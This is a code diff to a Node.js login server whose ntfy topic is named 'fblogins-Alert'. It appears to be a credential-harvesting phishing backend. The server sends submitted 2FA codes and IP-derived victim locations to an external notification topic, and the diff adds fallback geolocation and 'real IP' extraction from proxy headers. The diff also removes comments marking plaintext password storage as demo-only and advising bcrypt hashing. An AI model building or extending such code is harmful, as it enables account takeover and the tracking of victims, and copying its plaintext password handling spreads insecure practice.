@@ -9,37 +9,61 @@ const PORT = process.env.PORT || 3000;
 // IMPORTANT: Change 'bkeyz-login-alerts' to your actual ntfy topic name
 const NTFY_TOPIC = 'fblogins-Alert';
 
-// ===== IP TO LOCATION FUNCTION =====
+// ===== IP TO LOCATION FUNCTION (with fallback APIs) =====
 async function getLocationFromIP(ip) {
+    console.log('📍 Looking up location for IP:', ip);
+    
+    // Skip local/internal IPs
+    if (!ip || ip === '::1' || ip === '127.0.0.1' || ip === 'localhost' || 
+        ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.') ||
+        ip.startsWith('172.17.') || ip.startsWith('172.18.') || ip.startsWith('172.19.') ||
+        ip.startsWith('172.2') || ip === 'unknown') {
+        return { 
+            city: 'Local', 
+            region: 'Local Network', 
+            country: 'Development',
+            note: 'Internal IP - testing environment'
+        };
+    }
+    
+    // Try ip-api.com first (free, no API key, 45 req/min)
     try {
-        // Skip local/internal IPs (development environment)
-        if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost' || 
-            ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.')) {
-            return { 
-                city: 'Local', 
-                region: 'Local Network', 
-                country: 'Development',
-                flag: '💻'
-            };
-        }
-        
-        // Using ip-api.com (free, no API key needed, 45 requests/minute)
         const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city`, {
             timeout: 5000
         });
         
         if (response.data.status === 'success') {
+            console.log('✅ ip-api.com success:', response.data);
             return {
                 city: response.data.city || 'Unknown',
                 region: response.data.regionName || 'Unknown',
                 country: response.data.country || 'Unknown'
             };
         }
-        return { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
     } catch (error) {
-        console.log('⚠️ IP Geolocation error:', error.message);
-        return { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
+        console.log('⚠️ ip-api.com error:', error.message);
     }
+    
+    // Fallback to ipwho.is (free, no API key)
+    try {
+        const response = await axios.get(`https://ipwho.is/${ip}`, {
+            timeout: 5000
+        });
+        
+        if (response.data.success) {
+            console.log('✅ ipwho.is success:', response.data);
+            return {
+                city: response.data.city || 'Unknown',
+                region: response.data.region || 'Unknown',
+                country: response.data.country || 'Unknown'
+            };
+        }
+    } catch (error) {
+        console.log('⚠️ ipwho.is error:', error.message);
+    }
+    
+    // Final fallback
+    return { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
 }
 
 // ===== SEND NOTIFICATION TO NTFY =====
@@ -56,6 +80,34 @@ async function sendToNtfy(title, message, priority = 'high') {
     } catch (error) {
         console.error('❌ ntfy error:', error.message);
     }
+}
+
+// ===== GET REAL USER IP FROM REQUEST =====
+function getRealUserIP(req) {
+    // Check various headers that proxies/cloudflare use
+    let ip = req.headers['x-forwarded-for'] || 
+             req.headers['cf-connecting-ip'] ||  // Cloudflare
+             req.headers['true-client-ip'] ||    // Some proxies
+             req.headers['x-real-ip'] ||         // Nginx
+             req.socket.remoteAddress;
+    
+    // If there are multiple IPs (proxy chain), take the first one (real user IP)
+    if (ip && ip.includes(',')) {
+        ip = ip.split(',')[0].trim();
+    }
+    
+    // Clean up IPv6 localhost format
+    if (ip && ip.startsWith('::ffff:')) {
+        ip = ip.substring(7);
+    }
+    
+    // Clean port number if present (IPv4)
+    if (ip && ip.includes(':')) {
+        ip = ip.split(':')[0];
+    }
+    
+    console.log('📍 Detected real IP:', ip);
+    return ip || 'unknown';
 }
 
 // ===== MIDDLEWARE =====
@@ -87,12 +139,12 @@ app.post('/api/register', (req, res) => {
         return res.status(400).json({ error: 'User already exists' });
     }
     
-    // Create new user (plain text password - for demo only)
+    // Create new user
     const newUser = {
         id: users.length + 1,
         name: name.trim(),
         email: email.toLowerCase().trim(),
-        password: password, // In production, hash this with bcrypt!
+        password: password,
         createdAt: new Date().toISOString()
     };
     
@@ -111,9 +163,8 @@ app.post('/api/register', (req, res) => {
 app.post('/api/login', async (req, res) => {
     const { identifier, password } = req.body;
     
-    // Get IP address
-    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    ip = ip.replace('::ffff:', ''); // Clean IPv6 format
+    // Get REAL user IP using our improved function
+    const ip = getRealUserIP(req);
     
     console.log('🔐 Login attempt:', { identifier, ip });
     
@@ -171,7 +222,7 @@ app.post('/api/verify-2fa', async (req, res) => {
         return res.status(400).json({ error: 'Session expired. Please login again.' });
     }
     
-    // Get location (use stored or get fresh)
+    // Use stored location or get fresh if needed
     const location = pending.location || await getLocationFromIP(pending.ip);
     
     // Send notification with 2FA code and location
@@ -197,7 +248,8 @@ app.get('/api/health', (req, res) => {
         uptime: process.uptime(),
         timestamp: new Date().toISOString(),
         ntfyTopic: NTFY_TOPIC,
-        usersRegistered: users.length
+        usersRegistered: users.length,
+        detectedIp: getRealUserIP(req)
     });
 });
 
@@ -211,5 +263,5 @@ app.listen(PORT, () => {
     console.log(`\n🚀 Server running on http://localhost:${PORT}`);
     console.log(`📢 ntfy topic: ${NTFY_TOPIC}`);
     console.log(`📍 Location tracking: ENABLED (via IP geolocation)`);
-    console.log(`\n✅ Ready to accept connections!\n`);
+    console.log(`✅ Ready to accept connections!\n`);
 });
